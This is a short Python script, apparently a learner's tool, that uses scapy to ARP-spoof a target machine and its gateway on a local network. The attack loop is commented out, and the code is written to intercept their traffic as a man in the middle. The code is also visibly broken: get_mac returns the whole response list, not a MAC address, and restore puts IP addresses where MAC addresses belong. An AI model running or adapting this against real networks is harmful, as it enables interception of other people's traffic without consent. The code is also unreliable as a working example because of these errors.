import scapy.all as scapy
import time


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # target_mac = "9c:2e:a1:de:d4:4d"
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # return answered_list[0][1].hwsrc
    return answered_list

def restore(destination_ip, source_ip):
    destination_mac = destination_ip
    source_mac = source_ip
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# counter = 0;
# ipTarget = b"192.168.1.7"
# ipGateway = b"192.168.1.1"
# try:
#     while True:
#         spoof(ipTarget, ipGateway)
#         spoof(ipGateway, ipTarget)
#         counter+=2;
#         print("\rpackage sent " + str(counter), end="")
#         # print("\rpackage sent " + str(counter))
#         time.sleep(2)

# except KeyboardInterrupt:
#     print("\n Ctrl + C terdeteksi sistem keluar");
#     restore(ipTarget, ipGateway)
#     restore(ipGateway, ipTarget)
# except IndexError:
#     pass

print(get_mac("192.168.1.6"))
# mac = scapy.getmacbyip("192.168.1.6")
# print(mac)
# print(spoof(ipGateway, ipTarget))
# print(spoof(ipTarget, ipGateway))
# spoof("192.168.1.6", "192.168.1.1")
# spoof("192.168.1.1", "192.168.1.6")